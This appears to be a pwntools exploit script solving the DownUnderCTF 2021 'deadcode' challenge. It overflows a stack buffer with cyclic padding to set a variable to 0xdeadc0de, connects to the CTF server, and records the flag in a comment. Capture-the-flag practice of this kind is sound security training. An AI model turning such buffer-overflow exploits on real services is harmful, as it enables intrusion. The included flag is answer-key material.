#!/usr/bin/python3
from pwn import *
import os

elf = context.binary = ELF("deadcode")
libc = elf.libc
context.log_level = "DEBUG"

# main  0x11c9
# 0x1425 cmp     [rbp+var_1C], eax


gs = '''
break *0x4011DD
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return remote('pwn-2021.duc.tf', 31916)
        return process(elf.path)


# g = cyclic_gen() # Create a generator
msf=cyclic_metasploit(24)

print(elf.plt)
p=start()
p.sendlineafter('app?',msf+p64(0xdeadc0de))
p.interactive()

# DUCTF{y0u_br0ught_m3_b4ck_t0_l1f3_mn423kcv}